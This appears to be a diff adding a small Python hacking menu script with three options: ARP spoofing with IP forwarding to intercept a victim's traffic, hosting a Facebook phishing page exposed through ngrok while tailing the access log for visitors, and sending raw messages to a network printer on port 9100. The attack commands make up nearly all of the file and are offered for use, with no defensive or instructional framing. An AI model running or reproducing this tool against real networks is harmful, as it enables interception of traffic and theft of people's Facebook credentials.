@@ -1,0 +1,32 @@
+import os
+import socket as s
+
+bold = "\033[36m"
+green = "\033[1m"
+
+os.system('clear')
+print("\n\n\n\n")
+a=input(bold + green + "\t1. ARPspoofing + Forwarding\n\n\t2. Facebook Fishing Site\n\n\t3. Network Priter Hacking\n\n\t>> ")
+if a=="1":
+   interface=input(green + bold + "\n\tNetwork interface: ")
+   ip=input(green + bold + "\n\tIP: ")
+   gw=input(green + bold + "\n\tGW: ")
+   os.system('clear')
+   os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+   os.system('arpspoof -i ' + interface+' -t ' + ip + " " + gw + '& arpspoof -i ' + interface + ' -t ' +gw + " " + ip)
+if a=="2":
+   os.system('cat facebook > /var/www/html/index.html')
+   os.system('service apache2 restart')
+   os.system('gnome-terminal --command "./ngrok http 80"')
+   os.system('gnome-terminal --command "tail -f /var/log/apache2/access.log"')
+   os.system('clear')
+if a=="3":
+   printerip=input(green + bold + "\n\tprinter IP: ")
+   msg=input(green + bold + "\n\tmsg: ")
+   ss=s.socket(s.AF_INET, s.SOCK_STREAM)
+   ss.connect((printerip,9100))
+   ss.send (msg.encode('utf-8'))
+   ss.close()
+
+else:
+   os.system('clear')
